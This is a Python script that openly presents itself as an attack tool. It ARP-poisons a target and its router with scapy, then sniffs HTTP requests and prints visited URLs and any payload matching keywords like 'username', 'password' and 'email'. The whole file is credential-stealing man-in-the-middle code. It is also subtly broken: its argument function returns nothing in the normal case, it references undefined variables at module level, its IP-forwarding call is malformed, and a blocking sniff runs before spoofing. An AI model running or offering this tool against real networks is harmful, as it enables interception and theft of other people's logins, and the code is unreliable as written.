#! /usr/bin/env python

# This program will attack the target by first ARP Poisioning it and then reading the packets sent by them.
# This will help us get the usernames and passwords form the target.

import subprocess                # Import the subprocess module that will help us run system commands
import scapy.all as scapy        # Import the scapy.all module and we want to use it in that name of scapy
import optparse                  # Import the optparse module that will help us to take user arguements
import time                      # Import the time module that will help us to give delays where ever it is required
from scapy.layers import http    # Import http from scapy.layers module so that we can filter the http layers of the packets

def get_arguements():                         # Take arguements from the user about various parameters in the program

    parser = optparse.OptionParser()          # Parser is now the entity that will take the user arguments

    parser.add_option("-t", "--target", help="To specify the Target IP Address", dest="target_ip")
    # Take the target IP Address

    parser.add_option("-s", "--spoof", help="To specify the Spoof IP Address", dest="spoof_ip")
    # Take the spoof IP Address

    parser.add_option("-i", "--interval", help="To specify the interval between two packets sent in seconds. Default = 2", dest="timeout")
    # Take the time interval between the ARP Poisoning packets send

    parser.add_option("-d", "--device-interface", help="To specify the desired interface", dest="interface")
    # Take the interface from which the ARP Spoofed packets are going to flow

    (options, arguements) = parser.parse_args()

    if not options.target_ip:
        parser.error("[-] Please specify the Target IP Address")
        # Throw error if Target IP Address is not specified

    if not options.spoof_ip:
        parser.error("[-] Please specify the Spoof IP Address")
        # Throw error if Spoof IP Address is not specified

    if not options.interface:
        parser.error("[-] Please specify the desired interface from which the device is connected to internet")
        # Throw error if Interface is not specified

        return options

def get_mac(ip):                                       # This function will get the MAC Address from the device whose IP Address is specified

    arp_packet = scapy.ARP(pdst=ip)                    # Crafting a ARP Packet that has the destination IP
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")   # Crafting a Broadcast packet that has an boadcast MAC Address

    arp_request_broadcast = broadcast/arp_packet       # This Packet contains the data that has been crafted in ARP Packet and Broadcast Packet

    answer = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]     # This is the answer that we will recieve after send the request to the device
    return answer[0][1].hwsrc                            # This will return the hardware MAC Address of the given device

def spoof(target_ip, spoof_ip):                 # This function will spoof the Target and the spoof device

    target_mac = get_mac(target_ip)                         # This variable contains the Traget MAC Address
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)             # This is the ARP Poison Packet that we are intended to send

    # The following packet is to be sent to the target. pdst is the Target's ip that is to be set.
    # hwdst is the Target MAC Address. psrc is the Source MAC Address which in this case we need to set Routers MAC Address to inform the Target that we are the Router.
    #scapy.ls(packet)

    scapy.send(packet)                     # This will send the packet to the desired location

def restore(destination_ip, source_ip):         # This function will restore ARP tables in the target device

    destination_mac = get_mac(destination_ip)     # This variable contains the Destination MAC Address
    source_mac = get_mac(source_ip)               # This variable contains the Source MAC Address

    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)    # This is the packet intended to restore the ARP tables
    scapy.send(packet, count=4, verbose=False)     # We will send 4 packets just to make sure that ARP Tables of the taget device is properly restored.

def sniff(interface):          # This function will sniff the packets flowing through from the target device

    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets)       # Using scapy to sniff the packets

def process_sniffed_packets(packet):       # This function will process that sniffed packets

    if packet.haslayer(http.HTTPRequest):          # Is the packet has HTTP Protocol layer, then move forward

        url = "[+] url > " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path     # Variable that contains that url the target has visited
        # .Host contains the visited URL of the Target device
        # .path contains the visited URL Directory part of the Target device

        print(url)     # Print the URL (Host portion + Path portion)

        if packet.haslayer(scapy.Raw):       # If the packet has RAW Layer, then move forward
            load = packet[scapy.Raw].load    # Get the load section from the RAW part

            keywords = ["username", "uname", "user", "login", "password", "passwd", "pass", "key", "email", "e-mail"]    # Keywords that we are hunting for

            for keyword in keywords:      # for loop in each keyword in the list of keywords
                if keyword in load:       # If this keyword is found in the load part of the packet, then move forward
                    print("\n\n [+] Potential Credentials found > " + load + "\n\n")       # Print the potential Credentials such as Username and Password
                    break                     # If the potential credentials are found and printed, then get out of this loop

def while_arp_spoof():

    while True:                  # While the condition is true we want a loop be begain

        options = get_arguements()          # options will now contain all the arguments that we have mentioned in the get_arguements() function
        target_ip = options.target_ip      # Variable to store the target IP Address
        spoof_ip = options.spoof_ip         # Variable to store the spoof IP Address

        spoof(target_ip, spoof_ip)       # Tell the target that I am router
        spoof(spoof_ip, target_ip)       # Tell the router that I am target

        packet_sent = packet_sent + 2    # Keep incrementing the packet count that has to be displayed

        print("\r[+] Packet sent: " + str(packet_sent), end="")     # This comma will help in not printing the statements in the same line. This is only for python3

        #print("\r[+] Packet sent: " + str(packet_sent)),     # This comma will help in not printing the statements in the same line. (For python 2.7 only))
        #sys.stdout.flush()                                   # To flush the buffer were all ths packet send data is stored.

        if options.timeout:                       # If user has specified a timeout interval for the two ARP Packets sent consectively, use it
            time.sleep(options.timeout)           # we want an interval between the ARP Packet is sent as per the user has specified
        else:                                     # else if the user haven't specified any interval value, we will use the default value in this program
            time.sleep(2)                         # Send Packets at 2 seconds interval by default

        interface = options.interface
        sniff(interface)


print("[+] Enabling IP Forwarding ..... ")    # Starting to enabiling IP Forwarding
subprocess.call(['echo', '1', '>', 'echo 1 > /proc/sys/net/ipv4/ip_forward'])          # This will allow the data comming from the target to flow from this computer

packet_send = 0       # Initializing the packet sent count to be integer zero

try:                             # We want python the try to execute the code written further until exception will be provided

    interface = options.interface          # Variable that contains the user specified interface
    sniff(interface)                       # calling the sniff function.
    # First we will start the packet sniffer. Then we want to run ARP spoof attack that will be running in a loop as it is defined in the function.
    while_arp_spoof()

# Now as we have successfully ARP Poisoned the target and spoof (router in most cases), we want to intercept the data that is flow though us at an specified interface

except KeyboardInterrupt:          # While python was trying to execute the code that we specified, if the user has pressed CTRL + C which is considered
                                   # as Keyboard Interrupt, we want the further code to be executed mentioned here after.

    print("[+] CTRL + C detected ..... Restoring ARP Tables ..... Please wait")        # Requesting the user to wait till we correctly restore the ARP Tables in Target device as well as the spoof device.

    restore(options.target_ip, options.spoof_ip)      # calling the restore function.
    restore(options.spoof_ip, options.target_ip)      # calling the restore function.


